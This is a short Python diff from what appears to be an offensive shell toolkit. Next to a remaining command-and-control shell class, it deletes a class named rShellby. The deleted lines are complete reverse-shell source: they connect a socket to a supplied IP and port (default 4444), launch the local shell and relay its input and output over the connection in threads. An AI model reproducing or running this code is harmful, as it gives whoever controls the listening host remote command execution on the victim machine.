@@ -25,43 +25,6 @@ def findCorrectShell(strPlatform: str = ""):
     for strShell in arrUsed:
         if os.path.isfile(strShell): return str(strShell)
 
-class rShellby:
-    def __init__(self, ippassedPassed, portpassedPassed: str=4444, opsysPassed: str=""):
-        self.strIP = ippassedPassed
-        self.intPort = portpassedPassed
-        self.strOpSys = opsysPassed
-    def receiveOutput(self, objSocketPassed, objPopenPassed):
-        while True:
-            objData = objSocketPassed.recv(1024)
-            if len(objData) > 0:
-                objPopenPassed.stdin.write(objData)
-                objPopenPassed.stdin.flush()
-
-    def sendInput(self, objSocketPassed, objPopenPassed):
-        while True: objSocketPassed.send(objPopenPassed.stdout.read(1))
-
-    def runThread(self, strStage: str="receive"):
-        if "receive" == strStage: 
-            objThread = threading.Thread(target=self.receiveOutput, args=self.listArgs)
-        elif "send" == strStage:
-            objThread = threading.Thread(target=self.sendInput, args=self.listArgs)
-        objThread.daemon = True
-        objThread.start()
-
-    def startShell(self):
-        objSocket=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
-        objSocket.connect((self.strIP,self.intPort))
-        strShell = findCorrectShell(self.strOpSys)
-        objPopen=subprocess.Popen([strShell], 
-                            stdout=subprocess.PIPE, 
-                            stderr=subprocess.STDOUT, 
-                            stdin=subprocess.PIPE)
-        self.listArgs = [objSocket, objPopen]
-        self.runThread("receive")
-        self.runThread("send")
-        try: objPopen.wait()
-        except KeyboardInterrupt: objPopen.close()
-
 class c2cShellby:
 
     def __init__(self, strurlPassed: str="", bolsilentPassed: bool = True, strheaderPassed: str = ""):
